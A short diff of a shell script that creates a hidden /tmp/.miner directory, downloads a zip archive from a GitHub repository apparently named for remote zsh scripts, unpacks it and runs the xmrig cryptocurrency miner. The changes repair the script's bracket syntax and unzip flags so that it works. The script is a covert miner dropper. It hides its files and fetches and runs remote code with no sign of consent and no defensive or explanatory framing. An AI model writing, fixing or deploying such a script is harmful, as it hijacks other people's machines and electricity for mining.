@@ -1,10 +1,10 @@
 
-if [-d "/tmp/.miner"]; then
+if [ -d "/tmp/.miner"]; then
 else
 	mkdir /tmp/.miner
 fi
 curl https://raw.githubusercontent.com/Aleks4ndr/zsh_remote_script/main/miner.zip -o /tmp/.miner/miner.zip
 cd /tmp/.miner
-unzip miner.zip -d miner
+unzip -of miner.zip -d miner
 cd miner/xmrig-6.12.1
 ./xmrig
